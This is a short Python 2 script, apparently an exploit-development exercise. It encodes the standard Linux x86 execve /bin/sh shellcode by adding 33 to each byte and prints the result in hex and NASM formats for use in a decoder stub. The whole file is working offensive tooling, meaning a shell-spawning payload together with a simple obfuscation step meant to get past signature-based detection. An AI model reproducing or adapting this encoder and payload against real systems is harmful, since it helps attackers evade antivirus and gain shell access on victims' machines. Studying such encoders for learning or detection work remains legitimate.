#!/usr/bin/python

# Python rotate encoder using the execve-stack shellcode to operate on and as the payload 
import random
from trexshellz import args_shellcode

#if args_shellcode is not False:
#    shellcode = args_shellcode
#    print "Custom shellcode supplied: "+ shellcode
#else:
# Original shellcode (execve-stack - \bin\sh)
print "Using original execve-stack shellcode... "
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

sc_original = ""
encoded = ""
encoded2 = ""

print 'Rot33 encoded shellcode ...'

# change this value if you want to rotate more/less
# currently set to rotate one Max Verstappen
rotate = 33

for x in bytearray(shellcode):
    rotatedbyte = (x + rotate)%256

    sc_original += '\\x'
    sc_original += '%02x' % x

    encoded += '\\x'
    encoded += '%02x' % rotatedbyte

    encoded2 += '0x'
    encoded2 += '%02x,' % rotatedbyte

print "original shellcode: " + sc_original
print "hex format: " + encoded
print "nasm format: " + encoded2

print 'length: %d' % len(bytearray(shellcode))
